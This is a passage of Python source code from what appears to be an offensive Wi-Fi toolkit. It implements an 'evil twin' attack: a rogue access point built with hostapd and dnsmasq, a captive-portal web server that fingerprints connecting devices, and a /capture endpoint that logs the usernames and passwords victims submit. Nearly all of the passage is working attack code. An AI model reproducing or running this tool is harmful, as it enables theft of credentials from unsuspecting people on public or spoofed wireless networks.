        console.print(f"[bold green][+] Successfully started dnsmasq started (PID: {pid})");                     return True


    @classmethod
    def _terminate_instance(cls, iface):
        """This will cleanup all changes"""

        console.print("\n[bold yellow][*] Cleaning up...")
        subprocess.run(["pkill", "hostapd"], check=False)
        subprocess.run(["pkill", "dnsmasq"], check=False)
        subprocess.run(["ip", "addr", "flush", "dev", iface], check=False)
        subprocess.run(["systemctl", "start", "NetworkManager"], check=False)
        console.print("[bold green][+] Interface clean up completed.")
    


    class _Evil_Server(SimpleHTTPRequestHandler):
        """Sub class of Evil_Twin for HTTP Requesting handling"""

        def do_GET(self):
            """This will handle http requests that are made"""

            # Get device info
            user_agent = self.headers.get('User-Agent', 'Unknown')
            ip_address = self.client_address[0]
            language = self.headers.get('Accept-Language', 'Unknown')

            # Parse device details from User-Agent
            if 'iPhone' in user_agent or 'iPad' in user_agent:
                device_type = 'Apple'
                # Extract iOS version if present (e.g., "iPhone OS 17_1")
                if 'iPhone OS' in user_agent:
                    ios_ver = user_agent.split('iPhone OS ')[1].split(' ')[0].replace('_', '.')
                    device_info = f"iOS {ios_ver}"
                else:
                    device_info = "iOS"
            elif 'Mac' in user_agent:
                device_type = 'Apple'
                device_info = "macOS"
            elif 'Android' in user_agent:
                device_type = 'Android'
                # Extract Android version (e.g., "Android 14")
                if 'Android ' in user_agent:
                    android_ver = user_agent.split('Android ')[1].split(';')[0]
                    device_info = f"Android {android_ver}"
                else:
                    device_info = "Android"
            elif 'Windows' in user_agent:
                device_type = 'Windows'
                device_info = "Windows"
            elif 'Linux' in user_agent:
                device_type = 'Linux'
                device_info = "Linux"
            else:
                device_type = 'Unknown'
                device_info = "Unknown"

            # Captive portal detection - log device info
            if self.path in ['/hotspot-detect.html', '/library/test/success.html']:
                console.print(f"[bold cyan][+] {device_type} device connected | IP: {ip_address} | {device_info}")
                self.send_response(302)
                self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
                self.end_headers()
                return

            if self.path in ['/generate_204', '/gen_204']:
                console.print(f"[bold cyan][+] {device_type} device connected | IP: {ip_address} | {device_info}")
                self.send_response(302)
                self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
                self.end_headers()
                return

            if self.path in ['/ncsi.txt', '/connecttest.txt']:
                console.print(f"[bold cyan][+] {device_type} device connected | IP: {ip_address} | {device_info}")
                self.send_response(302)
                self.send_header('Location', f'http://{self.headers.get("Host", "10.0.0.1")}/')
                self.end_headers()
                return


            try:
                if self.path == '/' or self.path == '':
                    file_path = 'index.html'
                else:
                    file_path = self.path.lstrip('/')
                    if '..' in file_path:
                        file_path = 'index.html'

                try:
                    with open(file_path, 'rb') as f:
                        content = f.read()
                except FileNotFoundError:
                    with open('index.html', 'rb') as f:
                        content = f.read()


                if file_path.endswith('.html'):
                    content_type = 'text/html'
                elif file_path.endswith('.css'):
                    content_type = 'text/css'
                elif file_path.endswith('.js'):
                    content_type = 'application/javascript'
                elif file_path.endswith('.png'):
                    content_type = 'image/png'
                elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
                    content_type = 'image/jpeg'
                else:
                    content_type = 'text/html'

                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.end_headers()
                self.wfile.write(content)

            except Exception as e:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'Portal page not found')

        def do_POST(self):
            """Handle credential capture from portals"""

            if self.path == "/capture":
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)

                try:
                    data = json.loads(post_data.decode('utf-8'))
                    console.print(f"[bold red][!] CREDENTIALS CAPTURED:[bold yellow] {data}"); Evil_Twin.creds.append(data)
                except: pass

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')
            else:
                self.send_response(404)
                self.end_headers()


        @staticmethod
        def _Start_HTTP_Server(path, address="0.0.0.0", port=80):
            """This will launch HTTP Server"""


            os.chdir(str(path))

            server = HTTPServer(server_address=(address, port), RequestHandlerClass=Evil_Twin._Evil_Server)
            console.print(f"[bold green][+] Starting Evil_Twin Server on:[bold yellow] http://localhost:{port}")
            server.serve_forever()



    @classmethod
    def main(cls):
        """This will control class wide logic"""

        # PATHS
        hostapd_conf = "/etc/hostapd/evil_twin.conf"
        dnsmasq_conf = "/etc/dnsmasq.d/evil_twin.conf"
        dnsmasq_log = "/var/log/dnsmasq_evil.log"
        dnsmasq_leases = "/var/lib/misc/dnsmasq.leases"
        paths = [hostapd_conf, dnsmasq_conf, dnsmasq_log, dnsmasq_leases]
            
        cls.creds = []

        iface   = Variables.iface
        channel = Variables.channel or 6
        choice  = Variables.portal_num
         

        try:

            Background_Threads.channel_hopper(set_channel=channel)

            portal, ssid = Evil_Twin._choose_portal(choice=choice)
            conf_path, path = Evil_Twin._get_portal_path(portal=portal); print('\n')

            Evil_Twin._kill_processes()
            Evil_Twin._configure_interface(iface=iface)

            subprocess.run(["mkdir", "-p", "/etc/dnsmasq.d"], check=True)
            subprocess.run(["mkdir", "-p", "/var/lib/misc"], check=True)
            subprocess.run(["mkdir", "-p", "/var/log"], check=True)
            subprocess.run(["mkdir", "-p", "/etc/hostapd"], check=True)



            path_hostapd = Evil_Twin._create_hostapd_conf(path=hostapd_conf, iface=iface, ssid=ssid); Evil_Twin._start_hostapd(path=path_hostapd)
            path_dnsmasq = Evil_Twin._create_dnsmasq_conf(path=dnsmasq_conf, dnsmasq_log=dnsmasq_log, dnsmasq_leases=dnsmasq_leases, iface=iface); time.sleep(2); Evil_Twin._start_dnsmasq(path=path_dnsmasq)

            Evil_Twin._Evil_Server._Start_HTTP_Server(path=path)
        

        except KeyboardInterrupt: pass
        except Exception as e: console.print(f"[bold red]Exception Error:[bold yellow] {e}")
        

        finally:
            Evil_Twin._terminate_instance(iface=iface)
            console.print(f"[bold green][+] Captured Credentials:[bold yellow] {cls.creds}")
            console.input("[bold red]\n\nPress enter to exit: ")


        """
        1. Get interface
        2. Choose portal & SSID
        3. Configure interface IP (10.0.0.1) ✓
        4. Create hostapd.conf
        5. Create dnsmasq.conf
        6. Launch hostapd (fake AP)
        7. Launch dnsmasq (DHCP server)
        8. Start HTTP server (captive portal)
        """




if __name__ == "__main__": 


    test = 1

    if test == 1:  WiFi.network_scan_arp()
